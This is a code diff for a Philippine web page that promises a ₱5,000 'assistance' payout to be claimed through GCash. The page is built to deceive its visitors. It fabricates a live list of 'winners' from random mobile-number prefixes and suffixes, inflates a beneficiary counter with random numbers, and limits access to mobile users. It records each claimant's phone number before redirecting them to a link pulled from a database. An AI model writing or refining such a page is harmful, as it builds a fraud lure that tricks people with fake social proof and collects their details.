@@ -33,7 +33,16 @@
             text-align: center;
         }
 
-        .logo-img { width: 180px; margin-bottom: 15px; border-radius: 12px; }
+        /* PINALAKI: Pareho na ang sukat nito sa promo-photo */
+        .logo-img { 
+            width: 100%; 
+            height: auto; 
+            max-height: 200px; 
+            object-fit: cover; 
+            margin-bottom: 20px; 
+            border-radius: 15px; 
+        }
+
         .amount { font-family: 'Quicksand', sans-serif; font-size: 42px; font-weight: 700; color: var(--nature-green); margin-bottom: 20px; }
         
         .pay-button { 
@@ -63,14 +72,9 @@
         .gcash-icon { width: 20px; height: 20px; }
         .payout-green { color: #2d6a4f; font-weight: 800; }
 
-        /* BENEFICIARY FOOTER */
         .beneficiary-footer {
-            margin-top: 12px;
-            text-align: center;
-            font-size: 11px;
-            font-weight: 700;
-            color: var(--emerald);
-            text-transform: uppercase;
+            margin-top: 12px; text-align: center; font-size: 11px;
+            font-weight: 700; color: var(--emerald); text-transform: uppercase;
             letter-spacing: 0.5px;
         }
         .live-dot {
@@ -85,6 +89,7 @@
 
 <div class="card">
     <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_cover.jpg" class="logo-img">
+    
     <h1>Available Assistance</h1>
     <div class="amount" id="balanceText">₱5,000.00</div>
 
@@ -105,21 +110,17 @@
 <script src="js/config.js"></script>
 
 <script>
-    // 1. INITIALIZE FIREBASE
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // 2. SECURITY CHECK
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     if (!isMobile || sessionStorage.getItem('verified_user') !== 'true') {
         window.location.href = "index.html"; 
     }
 
-    // 3. CLAIM LOGIC
     function processClaim() {
         const btn = document.getElementById('claimBtn');
         const userPhone = sessionStorage.getItem('user_phone') || "Unknown";
-
         btn.disabled = true;
         btn.innerText = "VERIFYING SLOT...";
 
@@ -139,41 +140,27 @@
                     timestamp: firebase.database.ServerValue.TIMESTAMP
                 }).then(() => {
                     btn.innerText = "REDIRECTING...";
-                    setTimeout(() => {
-                        window.location.href = linkData.url;
-                    }, 1000);
+                    setTimeout(() => { window.location.href = linkData.url; }, 1000);
                 });
-
             } else {
-                alert("All slots are currently busy. Please refresh or wait for a few minutes.");
+                alert("All slots are currently busy. Please refresh.");
                 btn.disabled = false;
                 btn.innerText = "CLAIM THRU GCASH";
             }
-        })
-        .catch(err => {
-            console.error("Error:", err);
-            btn.disabled = false;
-            btn.innerText = "CLAIM THRU GCASH";
         });
     }
 
-    // 4. WINNERS & BENEFICIARY LIMIT LOGIC
-    // Simulan sa random number between 15 and 25
     let currentCount = Math.floor(Math.random() * (25 - 15 + 1)) + 15;
     const prefixes = ['0912', '0915', '0916', '0917', '0927', '0935', '0945', '0955', '0966'];
     
     function updateBeneficiaries() {
         const countDisplay = document.getElementById('b-count');
         const list = document.getElementById('winners-list');
-        
-        // I-update ang text display
         countDisplay.innerText = currentCount;
 
-        // Kung wala pang 26, magdagdag pa
         if (currentCount < 26) {
             const pref = prefixes[Math.floor(Math.random() * prefixes.length)];
             const suffix = Math.floor(1000 + Math.random() * 8999);
-
             const item = document.createElement('div');
             item.className = 'winner-item';
             item.innerHTML = `
@@ -183,22 +170,14 @@
                 </div>
                 <span class="payout-green">+₱5,000</span>
             `;
-
             list.prepend(item);
             if (list.children.length > 5) list.removeChild(list.lastChild);
-
-            // Dagdagan ang count para sa susunod na loop
             currentCount++;
-        } else {
-            // Kapag 26 na, hihinto na ang pag-increment
-            console.log("Limit reached: 26 beneficiaries.");
         }
     }
 
     document.addEventListener("DOMContentLoaded", () => {
-        // Initial call
         updateBeneficiaries();
-        // Loop every 3 seconds
         setInterval(updateBeneficiaries, 3000); 
     });
 </script>
